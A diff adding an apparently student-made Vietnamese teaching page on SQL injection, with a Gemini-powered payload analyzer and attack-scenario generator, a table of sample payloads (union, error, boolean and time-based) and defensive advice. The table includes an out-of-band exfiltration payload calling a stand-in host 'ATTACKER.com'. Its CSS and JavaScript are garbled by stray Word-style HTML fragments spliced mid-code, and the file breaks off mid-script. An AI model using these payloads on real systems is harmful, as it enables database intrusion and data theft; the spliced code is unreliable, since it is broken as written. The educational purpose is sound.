@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+
+<html lang="vi" class="scroll-smooth">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>SQL Injection: Giải Phẫu Một Cuộc Tấn Công - Thảo Luận Cùng Nhóm 8</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
+
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+
+    <style>
+
+        body {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            font-family: 'Inter', sans-serif;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #0a0a0a;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            color: #e5e7eb;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .gradient-text {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background: linear-gradient(to right, #34d399, #60a5fa);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            -webkit-background-clip: text;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            -webkit-text-fill-color: transparent;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .section-title {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-left: 4px solid #34d399;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            padding-left: 1rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .table-container {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            overflow-x: auto;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            -webkit-overflow-scrolling: touch;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        table {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-collapse: separate;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-spacing: 0;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        th, td {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-bottom: 1px solid #374151;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        th {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #1f2937;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        tr:nth-child(even) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #111827;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        tr:hover {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #1f2937;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .card {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background: rgba(255, 255, 255, 0.05);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border: 1px solid rgba(255, 255, 255, 0.1);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            transition: all 0.3s ease;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .card:hover {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            transform: translateY(-5px);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-color: #34d399;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .gemini-output h1, .gemini-output h2, .gemini-output h3 {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            font-weight: bold;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            margin-top: 1rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            margin-bottom: 0.5rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .gemini-output h1 { font-size: 1.5em; }
+
+        .gemini-output h2 { font-size: 1.25em; }
+
+        .gemini-output h3 { font-size: 1.1em; }
+
+        .gemini-output ul { list-style-type: disc; margin-left: 1.5rem; }
+
+        .gemini-output code {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #111827;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            color: #f3a0a0;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            padding: 0.2rem 0.4rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-radius: 0.25rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            font-family: monospace;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .gemini-output pre {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            background-color: #111827;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            padding: 1rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-radius: 0.5rem;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            overflow-x: auto;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        .loader {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border: 4px solid #f3f3f3;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-top: 4px solid #34d399;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            border-radius: 50%;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            width: 32px;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            height: 32px;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            animation: spin 1s linear infinite;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+        @keyframes spin {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            0% { transform: rotate(0deg); }
+
+            100% { transform: rotate(360deg); }
+
+        }
+
+    </style>
+
+</head>
+
+<body class="antialiased">
+
+ 
+
+    <!-- Hero Section -->
+
+    <header class="relative min-h-screen flex items-center justify-center text-center overflow-hidden px-4">
+
+        <div class="absolute inset-0 bg-black opacity-50 z-10"></div>
+
+        <div class="absolute inset-0 bg-gradient-to-t from-black via-transparent to-black"></div>
+
+        <div class="relative z-20 max-w-4xl mx-auto">
+
+            <h2 class="text-lg font-semibold text-emerald-400 uppercase tracking-widest">Dự án An Ninh Mạng - Nhóm 8</h2>
+
+            <h1 class="text-4xl md:text-6xl lg:text-7xl font-black my-4 leading-tight">
+
+                SQL INJECTION: <span class="gradient-text">GIẢI PHẪU MỘT CUỘC TẤN CÔNG</span>
+
+            </h1>
+
+            <p class="text-lg md:text-xl text-gray-300 max-w-2xl mx-auto mt-6">
+
+                Một phân tích chuyên sâu về một trong những lỗ hổng bảo mật web nguy hiểm và phổ biến nhất, từ cơ chế hoạt động đến chiến lược phòng thủ toàn diện.
+
+            </p>
+
+            <a href="#lab" class="mt-10 inline-block bg-emerald-500 text-white font-bold py-3 px-8 rounded-lg text-lg hover:bg-emerald-600 transition-colors duration-300">
+
+                Vào Phòng Thí Nghiệm AI
+
+            </a>
+
+        </div>
+
+    </header>
+
+ 
+
+    <main class="bg-black">
+
+        <!-- Section: AI Attack Lab -->
+
+        <section id="lab" class="py-20 md:py-32 bg-gray-900/50">
+
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+
+                <div class="text-center">
+
+                    <h2 class="text-3xl md:text-4xl font-bold section-title inline-block">Phòng Thí Nghiệm Tấn Công AI</h2>
+
+                    <p class="mt-4 text-lg text-gray-400 max-w-3xl mx-auto">
+
+                        Tương tác trực tiếp với AI để phân tích mã độc và tạo các kịch bản tấn công giả lập.
+
+                    </p>
+
+                </div>
+
+                <div class="mt-16 grid grid-cols-1 lg:grid-cols-2 gap-8 lg:gap-12">
+
+                    <!-- Payload Analyzer -->
+
+                    <div class="card p-6 md:p-8 rounded-xl">
+
+                        <h3 class="text-2xl font-bold text-center gradient-text">✨ Trình Phân Tích Payload SQLi</h3>
+
+                        <p class="text-center text-gray-400 mt-2">Nhập một payload và để Gemini phân tích nó.</p>
+
+                        <div class="mt-6">
+
+                            <textarea id="payload-input" class="w-full h-24 p-3 bg-gray-800 border border-gray-700 rounded-lg text-gray-200 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 transition" placeholder="' OR '1'='1' -- "></textarea>
+
+                            <button id="analyze-button" class="mt-4 w-full bg-emerald-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-emerald-600 transition-colors duration-300 flex items-center justify-center">
+
+                                Phân Tích Mã Độc
+
+                            </button>
+
+                        </div>
+
+                        <div id="payload-output-container" class="mt-6">
+
+                            <div id="payload-loader" class="hidden mx-auto loader"></div>
+
+                            <div id="payload-output" class="gemini-output p-4 bg-gray-900 border border-gray-700 rounded-lg min-h-[100px]"></div>
+
+                        </div>
+
+                    </div>
+
+ 
+
+                    <!-- Scenario Generator -->
+
+                    <div class="card p-6 md:p-8 rounded-xl">
+
+                        <h3 class="text-2xl font-bold text-center gradient-text">✨ Trình Tạo Kịch Bản Tấn Công</h3>
+
+                        <p class="text-center text-gray-400 mt-2">Chọn một ngành và để Gemini tạo kịch bản.</p>
+
+                        <div class="mt-6">
+
+                            <select id="scenario-select" class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg text-gray-200 focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 transition">
+
+                                <option value="Trang web Thương mại điện tử">Trang web Thương mại điện tử</option>
+
+                                <option value="Hệ thống Ngân hàng trực tuyến">Hệ thống Ngân hàng trực tuyến</option>
+
+                                <option value="Cổng thông tin Y tế">Cổng thông tin Y tế</option>
+
+                                <option value="Mạng xã hội">Mạng xã hội</option>
+
+                            </select>
+
+                            <button id="scenario-button" class="mt-4 w-full bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors duration-300 flex items-center justify-center">
+
+                                Tạo Kịch Bản
+
+                            </button>
+
+                        </div>
+
+                        <div id="scenario-output-container" class="mt-6">
+
+                             <div id="scenario-loader" class="hidden mx-auto loader"></div>
+
+                            <div id="scenario-output" class="gemini-output p-4 bg-gray-900 border border-gray-700 rounded-lg min-h-[100px]"></div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+ 
+
+        <!-- Section: Visualized Anatomy -->
+
+        <section id="anatomy" class="py-20 md:py-32">
+
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+
+                <div class="text-center">
+
+                    <h2 class="text-3xl md:text-4xl font-bold section-title inline-block">Giải phẫu Các Vector Tấn Công</h2>
+
+                    <p class="mt-4 text-lg text-gray-400 max-w-3xl mx-auto">
+
+                        Sơ đồ tổng hợp minh họa 3 con đường khai thác chính của SQL Injection, từ trực tiếp đến tàng hình.
+
+                    </p>
+
+                </div>
+
+                <div class="mt-16">
+
+                    <div class="bg-gray-900 p-4 md:p-8 rounded-2xl shadow-2xl border border-gray-700">
+
+                        <img src="https://storage.googleapis.com/maker-media-experiment/20240704_102008_533118.png" alt="Sơ đồ tổng hợp các kỹ thuật tấn công SQL Injection" class="rounded-lg w-full h-auto">
+
+                        <div class="mt-8 grid grid-cols-1 md:grid-cols-3 gap-6 text-center">
+
+                            <div class="p-4 rounded-lg">
+
+                                <h3 class="font-bold text-xl text-blue-400">1. In-Band (Trực tiếp)</h3>
+
+                                <p class="text-gray-400 mt-2 text-sm">Tấn công và nhận kết quả trên cùng một kênh. Nhanh chóng nhưng dễ bị phát hiện.</p>
+
+                            </div>
+
+                            <div class="p-4 rounded-lg">
+
+                                <h3 class="font-bold text-xl text-orange-400">2. Inferential (Suy luận)</h3>
+
+                                <p class="text-gray-400 mt-2 text-sm">Suy luận dữ liệu dựa trên hành vi (Đúng/Sai, Thời gian) của ứng dụng. Tàng hình và tinh vi.</p>
+
+                            </div>
+
+                            <div class="p-4 rounded-lg">
+
+                                <h3 class="font-bold text-xl text-red-500">3. Out-of-Band (Ngoài luồng)</h3>
+
+                                <p class="text-gray-400 mt-2 text-sm">Buộc CSDL kết nối ra máy chủ ngoài để tuồn dữ liệu. Kỹ thuật cao cấp, vượt qua tường lửa.</p>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+ 
+
+        <!-- Section: Attack Matrix -->
+
+        <section id="matrix" class="py-20 md:py-32 bg-gray-900/50">
+
+             <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+
+                <div class="text-center">
+
+                    <h2 class="text-3xl md:text-4xl font-bold section-title inline-block">Ma Trận Phân Tích Chuyên Sâu</h2>
+
+                    <p class="mt-4 text-lg text-gray-400 max-w-3xl mx-auto">
+
+                        Bóc tách chi tiết từng kỹ thuật tấn công: cơ chế, payload, rủi ro và giải pháp.
+
+                    </p>
+
+                </div>
+
+                <div class="mt-16 table-container bg-gray-900 rounded-xl shadow-lg border border-gray-800">
+
+                    <table class="w-full text-sm text-left">
+
+                        <thead class="text-xs text-gray-300 uppercase">
+
+                            <tr>
+
+                                <th scope="col" class="px-6 py-4">Hạng mục</th>
+
+                                <th scope="col" class="px-6 py-4">Mô tả & Mục tiêu</th>
+
+                                <th scope="col" class="px-6 py-4">Payload Mẫu</th>
+
+                                <th scope="col" class="px-6 py-4">Rủi ro & Tác động</th>
+
+                            </tr>
+
+                        </thead>
+
+                        <tbody>
+
+                            <tr class="border-t border-gray-800">
+
+                                <td colspan="4" class="px-6 py-3 font-bold text-emerald-400 bg-gray-800">I. IN-BAND SQLi (KÊNH TRỰC TIẾP)</td>
+
+                            </tr>
+
+                            <tr>
+
+                                <td class="px-6 py-4 font-medium">Union-based</td>
+
+                                <td class="px-6 py-4">Dùng `UNION` để gộp kết quả độc hại vào truy vấn hợp lệ. Mục tiêu: trích xuất dữ liệu.</td>
+
+                                <td class="px-6 py-4 font-mono text-pink-400">' UNION SELECT user, pass FROM users--</td>
+
+                                <td class="px-6 py-4 text-red-500 font-bold">CỰC CAO: Lộ toàn bộ dữ liệu.</td>
+
+                            </tr>
+
+                            <tr>
+
+                                <td class="px-6 py-4 font-medium">Error-based</td>
+
+                                <td class="px-6 py-4">Cố tình gây lỗi để CSDL trả về thông tin cấu trúc. Mục tiêu: do thám hệ thống.</td>
+
+                                <td class="px-6 py-4 font-mono text-pink-400">' AND 1=CAST(@@version AS INT)--</td>
+
+                                <td class="px-6 py-4 text-orange-500 font-bold">CAO: Lộ cấu trúc CSDL.</td>
+
+                            </tr>
+
+                             <tr class="border-t border-gray-800">
+
+                                <td colspan="4" class="px-6 py-3 font-bold text-emerald-400 bg-gray-800">II. INFERENTIAL SQLi (TẤN CÔNG SUY LUẬN)</td>
+
+                            </tr>
+
+                            <tr>
+
+                                <td class="px-6 py-4 font-medium">Boolean-based</td>
+
+                                <td class="px-6 py-4">Hỏi CSDL câu hỏi Đúng/Sai và quan sát sự thay đổi của trang web.</td>
+
+                                <td class="px-6 py-4 font-mono text-pink-400">' AND SUBSTR(pass,1,1)='a'--</td>
+
+                                <td class="px-6 py-4 text-red-500 font-bold">CỰC CAO: Lộ dữ liệu, khó phát hiện.</td>
+
+                            </tr>
+
+                            <tr>
+
+                                <td class="px-6 py-4 font-medium">Time-based</td>
+
+                                <td class="px-6 py-4">Dùng lệnh `SLEEP()` để gây trễ. Đo thời gian phản hồi để suy luận dữ liệu.</td>
+
+                                <td class="px-6 py-4 font-mono text-pink-400">' AND IF(1=1, SLEEP(5), 0)--</td>
+
+                                <td class="px-6 py-4 text-red-500 font-bold">CỰC CAO: Tấn công tàng hình nhất.</td>
+
+                            </tr>
+
+                             <tr class="border-t border-gray-800">
+
+                                <td colspan="4" class="px-6 py-3 font-bold text-emerald-400 bg-gray-800">III. OUT-OF-BAND SQLi (KÊNH NGOÀI LUỒNG)</td>
+
+                            </tr>
+
+                             <tr>
+
+                                <td class="px-6 py-4 font-medium">DNS/HTTP Exfiltration</td>
+
+                                <td class="px-6 py-4">Buộc CSDL tạo request mạng ra ngoài để gửi dữ liệu đến máy chủ của kẻ tấn công.</td>
+
+                                <td class="px-6 py-4 font-mono text-pink-400">...LOAD_FILE('\\\\ATTACKER.com\\log')</td>
+
+                                <td class="px-6 py-4 text-purple-500 font-bold">TUYỆT ĐỐI: Vượt tường lửa, chiếm quyền.</td>
+
+                            </tr>
+
+                        </tbody>
+
+                    </table>
+
+                </div>
+
+            </div>
+
+        </section>
+
+ 
+
+        <!-- Section: Defense in Depth -->
+
+        <section id="defense" class="py-20 md:py-32">
+
+            <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+
+                <div class="text-center">
+
+                    <h2 class="text-3xl md:text-4xl font-bold section-title inline-block">Chiến Lược Phòng Thủ Theo Chiều Sâu</h2>
+
+                    <p class="mt-4 text-lg text-gray-400 max-w-3xl mx-auto">
+
+                        Không có viên đạn bạc nào. Bảo vệ hệ thống đòi hỏi một chiến lược đa tầng vững chắc.
+
+                    </p>
+
+                </div>
+
+                <div class="mt-16 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+
+                    <!-- Card 1 -->
+
+                    <div class="card p-8 rounded-xl text-center">
+
+                        <div class="text-emerald-400 mx-auto h-16 w-16 flex items-center justify-center rounded-full bg-gray-800">
+
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
+
+                        </div>
+
+                        <h3 class="mt-6 text-xl font-bold">Truy vấn Tham số hóa</h3>
+
+                        <p class="mt-2 text-gray-400">Tiêu chuẩn vàng. Tách biệt hoàn toàn mã lệnh và dữ liệu, vô hiệu hóa SQLi từ gốc.</p>
+
+                    </div>
+
+                    <!-- Card 2 -->
+
+                    <div class="card p-8 rounded-xl text-center">
+
+                         <div class="text-emerald-400 mx-auto h-16 w-16 flex items-center justify-center rounded-full bg-gray-800">
+
+                           <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7" /></svg>
+
+                        </div>
+
+                        <h3 class="mt-6 text-xl font-bold">Sử dụng ORM</h3>
+
+                        <p class="mt-2 text-gray-400">Các thư viện như Hibernate, SQLAlchemy tự động xử lý việc tham số hóa, giảm thiểu lỗi từ con người.</p>
+
+                    </div>
+
+                    <!-- Card 3 -->
+
+                    <div class="card p-8 rounded-xl text-center">
+
+                         <div class="text-emerald-400 mx-auto h-16 w-16 flex items-center justify-center rounded-full bg-gray-800">
+
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
+
+                        </div>
+
+                        <h3 class="mt-6 text-xl font-bold">Nguyên tắc Đặc quyền Tối thiểu</h3>
+
+                        <p class="mt-2 text-gray-400">Tài khoản CSDL của ứng dụng chỉ nên có những quyền hạn tối thiểu cần thiết để hoạt động.</p>
+
+                    </div>
+
+                    <!-- Card 4 -->
+
+                    <div class="card p-8 rounded-xl text-center">
+
+                         <div class="text-emerald-400 mx-auto h-16 w-16 flex items-center justify-center rounded-full bg-gray-800">
+
+                           <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002-2h2a2 2 0 002 2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" /></svg>
+
+                        </div>
+
+                        <h3 class="mt-6 text-xl font-bold">Xác thực & Lọc Đầu vào</h3>
+
+                        <p class="mt-2 text-gray-400">Luôn xác thực dữ liệu từ người dùng. Ưu tiên "danh sách trắng" (whitelist) thay vì "danh sách đen" (blacklist).</p>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        </section>
+
+    </main>
+
+ 
+
+    <!-- Footer -->
+
+    <footer class="bg-gray-900 border-t border-gray-800">
+
+        <div class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8 text-center">
+
+            <p class="text-base text-gray-400">
+
+                Tài liệu nghiên cứu được thực hiện và trình bày bởi <span class="font-bold text-emerald-400">Nhóm 8</span>.
+
+            </p>
+
+            <p class="mt-2 text-sm text-gray-500">
+
+                Bảo mật không phải là một sản phẩm, mà là một quá trình.
+
+            </p>
+
+        </div>
+
+    </footer>
+
+ 
+
+<script>
+
+    // --- Gemini API Interaction ---
+
+ 
+
+    const analyzeButton = document.getElementById('analyze-button');
+
+    const payloadInput = document.getElementById('payload-input');
+
+    const payloadOutput = document.getElementById('payload-output');
+
+    const payloadLoader = document.getElementById('payload-loader');
+
+ 
+
+    const scenarioButton = document.getElementById('scenario-button');
+
+    const scenarioSelect = document.getElementById('scenario-select');
+
+    const scenarioOutput = document.getElementById('scenario-output');
+
+    const scenarioLoader = document.getElementById('scenario-loader');
+
+ 
+
+    const apiKey = ""; // API Key is handled by the environment
+
+ 
+
+    async function callGemini(prompt, outputElement, loaderElement, buttonElement) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        loaderElement.style.display = 'block';</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        outputElement.innerHTML = '';</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        buttonElement.disabled = true;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        </span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        try {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+
+            const payload = {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                contents: [{ role: "user", parts: [{ text: prompt }] }]
+
+            };
+
+ 
+
+            const response = await fetch(apiUrl, {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                method: 'POST',</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                headers: { 'Content-Type': 'application/json' },
+
+                body: JSON.stringify(payload)
+
+            });
+
+ 
+
+            if (!response.ok) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                throw new Error(`API Error: ${response.statusText}`);
+
+            }
+
+ 
+
+            const result = await response.json();
+
+           
+
+            if (result.candidates && result.candidates.length > 0 &&
+
+                result.candidates[0].content && result.candidates[0].content.parts &&
+
+                result.candidates[0].content.parts.length > 0) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                const text = result.candidates[0].content.parts[0].text;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                outputElement.innerHTML = marked.parse(text);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            } else {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">                outputElement.innerText = 'Lỗi: Không nhận được phản hồi hợp lệ từ AI. Vui lòng thử lại.';</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            }
+
+ 
+
+        } catch (error) {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            console.error(error);</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            outputElement.innerText = `Đã xảy ra lỗi: ${error.message}. Vui lòng kiểm tra console để biết thêm chi tiết.`;
+
+        } finally {</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            loaderElement.style.display = 'none';</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">            buttonElement.disabled = false;</span></p> <p class="MsoNormal" style="background:#000000;"><span style="font-size:15pt;font-family:'Times New Roman', serif;color:#FFFFFF;">        }
+
+    }
+
+ 
+
